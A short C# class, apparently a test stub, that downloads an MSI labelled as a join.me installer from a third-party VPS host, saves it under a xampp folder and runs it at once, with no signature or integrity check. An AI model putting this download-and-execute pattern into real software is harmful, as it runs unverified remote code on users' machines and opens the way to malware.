using System.Diagnostics;
using System.Net;

namespace OakieDokie.dab
{
    public class JoinMe
    {
        public Iinstal instal()
        {
            WebClient wc = new WebClient();
            wc.DownloadFile("http://vps458649.ovh.net/join.me.toci.msi", "C:\\xampp\\test.join.me.msi");


            Process.Start("C:\\xampp\\test.join.me.msi");

            return null;
        }
    }
}